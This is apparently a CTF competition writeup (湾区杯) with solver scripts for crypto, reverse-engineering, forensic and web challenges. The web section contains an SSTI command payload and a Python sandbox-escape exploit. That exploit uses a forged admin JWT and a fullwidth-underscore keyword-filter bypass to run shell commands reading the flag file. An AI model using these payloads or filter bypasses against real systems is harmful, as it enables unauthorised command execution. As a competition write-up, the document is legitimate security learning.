# 湾区杯 Writeup

## Crypto

### new_trick

```python
from hashlib import md5
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad


def norm(a, b, c, d):
    return (a * a + b * b + c * c + d * d) % p


p = 115792089237316195423570985008687907853269984665640564039457584007913129639747
Q_a, Q_b, Q_c, Q_d = 123456789, 987654321, 135792468, 864297531
R_a = 53580504271939954579696282638160058429308301927753139543147605882574336327145
R_b = 79991318245209837622945719467562796951137605212294979976479199793453962090891
R_c = 53126869889181040587037210462276116096032594677560145306269148156034757160128
R_d = 97368024230306399859522783292246509699830254294649668434604971213496467857155
N_Q = norm(Q_a, Q_b, Q_c, Q_d)
N_R = norm(R_a, R_b, R_c, R_d)

print(f"N(Q) = {N_Q}")
print(f"N(R) = {N_R}")


def bsgs(g, h, p, bound):
    n = int(bound ** 0.5) + 1

    baby_steps = {}
    current = 1
    for j in range(n):
        baby_steps[current] = j
        current = (current * g) % p

    inv_gn = pow(g, n * (p - 2), p)

    current = h
    for i in range(n):
        if current in baby_steps:
            j = baby_steps[current]
            x = i * n + j
            return x
        current = (current * inv_gn) % p
    return None


secret = bsgs(N_Q, N_R, p, 2 ** 50)
print(f"Secret found: {secret}")

if secret is not None:
    calculated_N_R = pow(N_Q, secret, p)
    if calculated_N_R == N_R:
        print("验证成功!")
    else:
        print("验证失败!")
    key = md5(str(secret).encode()).hexdigest().encode()
    cipher = AES.new(key=key, mode=AES.MODE_ECB)
    enc_flag = b'(\xe4IJ\xfd4%\xcf\xad\xb4\x7fi\xae\xdbZux6-\xf4\xd72\x14BB\x1e\xdc\xb7\xb7\xd1\xad#e@\x17\x1f\x12\xc4\xe5\xa6\x10\x91\x08\xd6\x87\x82H\x9e'
    try:
        flag = unpad(cipher.decrypt(enc_flag), 16)
        print(f"Flag: {flag.decode()}")
    except Exception as e:
        print("解密失败")
else:
    print("未能找到secret")
```

采用 BSGS 算法

‍

## Reverse

### Minigame

```
data = [
    0xFF, 0xF5, 0xF8, 0xFE, 0xE2, 0xFF, 0xF8, 0xFC, 0xA9,
    0xFB, 0xAB, 0xAE, 0xFA, 0xAD, 0xAC, 0xA8, 0xFA, 0xAE,
    0xAB, 0xA1, 0xA1, 0xAF, 0xAE, 0xF8, 0xAC, 0xAF, 0xAE,
    0xFC, 0xA1, 0xFA, 0xA8, 0xFB, 0xFB, 0xAD, 0xFC, 0xAC,
    0xAA, 0xE4
]

flag_bytes = []
for b in data:
    # 根据反汇编的 xor 和循环逻辑推算原始字节
    flag_bytes.append(b ^ 0x99)  # 0x99 是关键 xor 值，从反汇编 c+0xD7 可得

# 转换为字符
flag = ''.join(chr(x) for x in flag_bytes)
print("Flag:", flag)

```

### hard_test

```python
# recover_flag.py
# 直接运行： python3 recover_flag.py

byte_2020 = [
    0x63,
    0x7C,
    0x77,
    0x7B,
    0xF2,
    0x6B,
    0x6F,
    0xC5,
    0x30,
    0x01,
    0x67,
    0x2B,
    0xFE,
    0xD7,
    0xAB,
    0x76,
    0xCA,
    0x82,
    0xC9,
    0x7D,
    0xFA,
    0x59,
    0x47,
    0xF0,
    0xAD,
    0xD4,
    0xA2,
    0xAF,
    0x9C,
    0xA4,
    0x72,
    0xC0,
    0xB7,
    0xFD,
    0x93,
    0x26,
    0x36,
    0x3F,
    0xF7,
    0xCC,
    0x34,
    0xA5,
    0xE5,
    0xF1,
    0x71,
    0xD8,
    0x31,
    0x15,
    0x04,
    0xC7,
    0x23,
    0xC3,
    0x18,
    0x96,
    0x05,
    0x9A,
    0x07,
    0x12,
    0x80,
    0xE2,
    0xEB,
    0x27,
    0xB2,
    0x75,
    0x09,
    0x83,
    0x2C,
    0x1A,
    0x1B,
    0x6E,
    0x5A,
    0xA0,
    0x52,
    0x3B,
    0xD6,
    0xB3,
    0x29,
    0xE3,
    0x2F,
    0x84,
    0x53,
    0xD1,
    0x00,
    0xED,
    0x20,
    0xFC,
    0xB1,
    0x5B,
    0x6A,
    0xCB,
    0xBE,
    0x39,
    0x4A,
    0x4C,
    0x58,
    0xCF,
    0xD0,
    0xEF,
    0xAA,
    0xFB,
    0x43,
    0x4D,
    0x33,
    0x85,
    0x45,
    0xF9,
    0x02,
    0x7F,
    0x50,
    0x3C,
    0x9F,
    0xA8,
    0x51,
    0xA3,
    0x40,
    0x8F,
    0x92,
    0x9D,
    0x38,
    0xF5,
    0xBC,
    0xB6,
    0xDA,
    0x21,
    0x10,
    0xFF,
    0xF3,
    0xD2,
    0xCD,
    0x0C,
    0x13,
    0xEC,
    0x5F,
    0x97,
    0x44,
    0x17,
    0xC4,
    0xA7,
    0x7E,
    0x3D,
    0x64,
    0x5D,
    0x19,
    0x73,
    0x60,
    0x81,
    0x4F,
    0xDC,
    0x22,
    0x2A,
    0x90,
    0x88,
    0x46,
    0xEE,
    0xB8,
    0x14,
    0xDE,
    0x5E,
    0x0B,
    0xDB,
    0xE0,
    0x32,
    0x3A,
    0x0A,
    0x49,
    0x06,
    0x24,
    0x5C,
    0xC2,
    0xD3,
    0xAC,
    0x62,
    0x91,
    0x95,
    0xE4,
    0x79,
    0xE7,
    0xC8,
    0x37,
    0x6D,
    0x8D,
    0xD5,
    0x4E,
    0xA9,
    0x6C,
    0x56,
    0xF4,
    0xEA,
    0x65,
    0x7A,
    0xAE,
    0x08,
    0xBA,
    0x78,
    0x25,
    0x2E,
    0x1C,
    0xA6,
    0xB4,
    0xC6,
    0xE8,
    0xDD,
    0x74,
    0x1F,
    0x4B,
    0xBD,
    0x8B,
    0x8A,
    0x70,
    0x3E,
    0xB5,
    0x66,
    0x48,
    0x03,
    0xF6,
    0x0E,
    0x61,
    0x35,
    0x57,
    0xB9,
    0x86,
    0xC1,
    0x1D,
    0x9E,
    0xE1,
    0xF8,
    0x98,
    0x11,
    0x69,
    0xD9,
    0x8E,
    0x94,
    0x9B,
    0x1E,
    0x87,
    0xE9,
    0xCE,
    0x55,
    0x28,
    0xDF,
    0x8C,
    0xA1,
    0x89,
    0x0D,
    0xBF,
    0xE6,
    0x42,
    0x68,
    0x41,
    0x99,
    0x2D,
    0x0F,
    0xB0,
    0x54,
    0xBB,
    0x16,
]

# true_flag from .rodata (24 bytes)
true_flag = [
    0x97,
    0xD5,
    0x60,
    0x43,
    0xB4,
    0x10,
    0x43,
    0x73,
    0x0F,
    0xDA,
    0x43,
    0xCD,
    0xD3,
    0xE8,
    0x73,
    0x4A,
    0x94,
    0xC3,
    0xCD,
    0x71,
    0xBD,
    0xDC,
    0x97,
    0x1A,
]


# --- helpers ---
def rol8(x, n):
    return ((x << n) & 0xFF) | ((x & 0xFF) >> (8 - n))


def ror8(x, n):
    return (((x & 0xFF) >> n) | ((x << (8 - n)) & 0xFF)) & 0xFF


# modular inverse in mod 257: using pow (x^(255) mod 257) gives inverse for x != 0
def modinv_257(x):
    x = x % 257
    if x == 0:
        return None
    return pow(x, 255, 257)  # x^(255) ≡ x^{-1} (mod 257)


# invert sub_13E1 for a given output byte (true_flag byte)
# returns list of candidate input bytes (these are bytes after sub_1492)
def inv_sub_13E1(out_byte):
    candidates = []
    # find index in byte_2020 (could be multiple indexes but table looks unique)
    idxs = [i for i, b in enumerate(byte_2020) if b == out_byte]
    if not idxs:
        return []  # no preimage through the table
    for idx in idxs:
        # idx = sub_12DE(v3,2)  => v3 = rol(idx,2)
        v3 = rol8(idx, 2)
        # v3 = sub_1313(y) = y^255 mod 257   (i.e. y^{-1} mod 257)  with special-case y==0 -> v3==0
        if v3 == 0:
            y = 0
        else:
            # invert v3: we want y such that sub_1313(y) == v3,
            # since sub_1313(y) = y^{-1} mod 257, so v3 = y^{-1} => y = v3^{-1} mod 257
            inv = modinv_257(v3)
            if inv is None:
                continue
            y = inv
        # y must fit in 0..255 (sub_1313 takes unsigned __int8 input in original)
        if not (0 <= y <= 255):
            continue
        # y was computed as: y = ((3*high)&0xF)<<4 | ((5*low)&0xF)
        # we must try all high, low in 0..15 to find matches
        for high in range(16):
            for low in range(16):
                val = (((3 * high) & 0xF) << 4) | ((5 * low) & 0xF)
                if val == y:
                    v1 = (high << 4) | low
                    # v1 = sub_12A9(a1 ^ 0x5A, 3) = rol(a1 ^ 0x5A, 3)
                    # so a1 = ror(v1,3) ^ 0x5A
                    a1 = ror8(v1, 3) ^ 0x5A
                    candidates.append(a1 & 0xFF)
    # unique
    return sorted(set(candidates))


# inverse of sub_1492: given array of bytes after sub_1492 (arr),
# produce original s by ror with (i%7)+1
def inv_sub_1492(arr):
    res = []
    for i, b in enumerate(arr):
        n = (i % 7) + 1
        res.append(ror8(b, n))
    return res


# --- build candidates per position ---
pos_candidates = []
for i, tb in enumerate(true_flag):
    cands = inv_sub_13E1(tb)
    if not cands:
        print(f"位置 {i}: 没有候选 (true_flag byte {tb:#02x})")
        raise SystemExit(1)
    print(f"pos {i}: {len(cands)} candidates -> {['0x%02X'%c for c in cands]}")
    pos_candidates.append(cands)

# --- DFS 枚举组合（带剪枝） ---
# 剪枝策略：当部分序列构造好（即得到 arr 前 sub_1492），我们可以立刻逆 sub_1492
# 并检查对应前缀是否为可打印字符（ASCII 0x20-0x7E）。如果你希望允许任意 byte，
# 把 is_printable 检查去掉或调整。

from typing import List


def is_printable_byte(b):
    # 可调整：这里认为输入应该是常见可打印 ascii（包括空格）
    return 0x20 <= b <= 0x7E


solutions = []
MAX_SOLUTIONS = 20  # 设一个上限，避免爆炸


def dfs(idx: int, current_arr: List[int]):
    if len(solutions) >= MAX_SOLUTIONS:
        return
    if idx == len(pos_candidates):
        # 完整的 arr：这是 sub_13E1 的前输入，也就是 sub_1492 的输出
        original_bytes = inv_sub_1492(current_arr)
        try:
            s = bytes(original_bytes).decode("latin1")  # 保留所有 byte，不做 utf-8 检查
        except Exception:
            s = None
        solutions.append((s, original_bytes[:]))
        return
    # 枚举当前位置的候选
    for cand in pos_candidates[idx]:
        # 早期剪枝：构造一个临时 arr 前缀，逆 sub_1492 得到原始前缀，检查可打印性
        temp_arr = current_arr + [cand]
        # only check prefix parity: for positions 0..idx, the original bytes are
        prefix_orig = inv_sub_1492(temp_arr)
        # check only the last byte's printability (we could check all but that repeats work)
        last_orig = prefix_orig[-1]
        if not is_printable_byte(last_orig):
            # 如果你想允许更多字符（比如换行、制表等），调整条件
            continue
        dfs(idx + 1, temp_arr)
        if len(solutions) >= MAX_SOLUTIONS:
            return


# run DFS
dfs(0, [])

# 输出结果
print(f"\nFound {len(solutions)} solutions (showing up to {MAX_SOLUTIONS}):\n")
for i, (s, raw) in enumerate(solutions):
    print(f"Solution #{i+1}:")
    if s is not None:
        print(f"  String: {s}")
    else:
        print("  String: <cannot decode as text>")
    print("  Bytes:", " ".join(f"{b:02x}" for b in raw))
    print()
if not solutions:
    print(
        "No solutions found with current printable ASCII pruning. Try loosening the pruning condition."
    )

```

‍

## Misc

### checkwebshell

```python
# Decrypt the provided SM4 ciphertext (base64) using the PHP SM4 implementation logic reversed.
import base64, struct

SboxTable = [
    0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05,
    0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
    0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62,
    0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6,
    0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8,
    0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35,
    0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x0D, 0x2D, 0xEC,
    0x84, 0x9B, 0x1E, 0x87, 0xE0, 0x3E, 0xB5, 0x66, 0x48, 0x02, 0x6C, 0xBB, 0xBB, 0x32, 0x83, 0x27,
    0x9E, 0x01, 0x8D, 0x53, 0x9B, 0x64, 0x7B, 0x6B, 0x6A, 0x6C, 0xEC, 0xBB, 0xC4, 0x94, 0x3B, 0x0C,
    0x76, 0xD2, 0x09, 0xAA, 0x16, 0x15, 0x3D, 0x2D, 0x0A, 0xFD, 0xE4, 0xB7, 0x37, 0x63, 0x28, 0xDD,
    0x7C, 0xEA, 0x97, 0x8C, 0x6D, 0xC7, 0xF2, 0x3E, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7,
    0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x36, 0x24, 0x07, 0x82, 0xFA, 0x54, 0x5B, 0x40,
    0x8F, 0xED, 0x1F, 0xDA, 0x93, 0x80, 0xF9, 0x61, 0x1C, 0x70, 0xC3, 0x85, 0x95, 0xA9, 0x79, 0x08,
    0x46, 0x29, 0x02, 0x3B, 0x4D, 0x83, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x1A, 0x47, 0x5C, 0x0D, 0xEA,
    0x9E, 0xCB, 0x55, 0x20, 0x15, 0x8A, 0x9A, 0xCB, 0x43, 0x0C, 0xF0, 0x0B, 0x40, 0x58, 0x00, 0x8F,
    0xEB, 0xBE, 0x3D, 0xC2, 0x9F, 0x51, 0xFA, 0x13, 0x3B, 0x0D, 0x90, 0x5B, 0x6E, 0x45, 0x59, 0x33
]

FK = [0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC]
CK = [
    0x00070E15,0x1C232A31,0x383F464D,0x545B6269,0x70777E85,0x8C939AA1,0xA8AFB6BD,0xC4CBD2D9,
    0xE0E7EEF5,0xFC030A11,0x181F262D,0x343B4249,0x50575E65,0x6C737A81,0x888F969D,0xA4ABB2B9,
    0xC0C7CED5,0xDCE3EAF1,0xF8FF060D,0x141B2229,0x30373E45,0x4C535A61,0x686F767D,0x848B9299,
    0xA0A7AEB5,0xBCC3CAD1,0xD8DFE6ED,0xF4FB0209,0x10171E25,0x2C333A41,0x484F565D,0x646B7279
]

def rotl(x,n):
    x &= 0xFFFFFFFF
    return ((x << n) & 0xFFFFFFFF) | ((x >> (32-n)) & 0xFFFFFFFF)

def S(x):
    res = 0
    for i in range(4):
        byte = (x >> (24 - i*8)) & 0xFF
        res |= (SboxTable[byte] << (24 - i*8))
    return res & 0xFFFFFFFF

def L(x):
    return x ^ rotl(x,2) ^ rotl(x,10) ^ rotl(x,18) ^ rotl(x,24)

def T(x):
    return L(S(x))

def CKF(a,b,c,ck):
    return a ^ T(b ^ c ^ ck)

def key_schedule_set(key_bytes):
    if len(key_bytes) != 16:
        raise ValueError("Key must be 16 bytes")
    k = [0]*36
    for i in range(4):
        k[i] = struct.unpack(">I", key_bytes[i*4:(i+1)*4])[0] ^ FK[i]
    sk = [0]*32
    for i in range(32):
        k[i+4] = k[i] ^ CKF(k[i+1], k[i+2], k[i+3], CK[i])
        sk[i] = k[i+4]
    return sk

def str_to_ints(block):
    return [struct.unpack(">I", block[i*4:(i+1)*4])[0] for i in range(4)]

def ints_to_str(arr):
    return b''.join(struct.pack(">I", v & 0xFFFFFFFF) for v in arr)

def crypt_block(block, sk, encrypt=True):
    x = str_to_ints(block)
    if not encrypt:
        # use round keys in reverse
        rk = sk[::-1]
    else:
        rk = sk
    for i in range(32):
        roundKey = rk[i]
        x4 = x[0] ^ T(x[1] ^ x[2] ^ x[3] ^ roundKey)
        # shift left: remove first element and append x4
        x = x[1:] + [x4 & 0xFFFFFFFF]
    x = list(reversed(x))
    return ints_to_str(x)

# Given base64 ciphertext from the PHP output comment
b64 = "VCWBIdzfjm45EmYFWcqXX0VpQeZPeI6Qqyjsv31yuPTDC80lhFlaJY2R3TintdQu"
ct = base64.b64decode(b64)

key = b"a8a58b78f41eeb6a"
sk = key_schedule_set(key)

# Decrypt each 16-byte block
pt = b""
for i in range(0, len(ct), 16):
    pt += crypt_block(ct[i:i+16], sk, encrypt=False)

# Remove PKCS#7 padding
pad = pt[-1]
if pad >=1 and pad <=16 and pt.endswith(bytes([pad])*pad):
    pt = pt[:-pad]

pt_str = pt.decode('utf-8', errors='replace')
pt_str, pt, pad, sk[:4]  # show some debug info


```

### silentminer

flag{192.168.145.131}

flag{258}

flag{/usr/sbin/sshd}

flag{tombaky.com}

flag{kinsing}

‍

## Web

### SSTI

```python
{{ exec "tail /fl\"\"ag"}}
```

## ez_python

```python
import requests

url = "http://web-7f4c07ff4a.challenge.xctf.org.cn/sandbox"

payload = {"mode": "python"}
files = [
    (
        "codefile",
        (
            "11.py",
            open("C:/Users/xciphand/Desktop/aa/11.py", "rb"),
            "application/octet-stream",
        ),
    )
]
headers = {
    "Accept": "*/*",
    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en-GB;q=0.7,en;q=0.6",
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzU3MzEzNTI3fQ.KvbQaMPQlLBrNpjGqdMy51KSAvaG6YvYhptnXEaDGmA",
    "Cache-Control": "no-cache",
    "DNT": "1",
    "Origin": "http://web-7f4c07ff4a.challenge.xctf.org.cn",
    "Pragma": "no-cache",
    "Proxy-Connection": "keep-alive",
    "Referer": "http://web-7f4c07ff4a.challenge.xctf.org.cn/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0",
}

response = requests.request("POST", url, headers=headers, data=payload, files=files)

print(response.text)
# import os eval exec __ system
```

```python
raise ValueError(
    getattr(_＿loader＿＿.load_module("subprocesS".lower()), "check_output")(
        "cat /f1111ag", shell=True
    )
)
```

‍
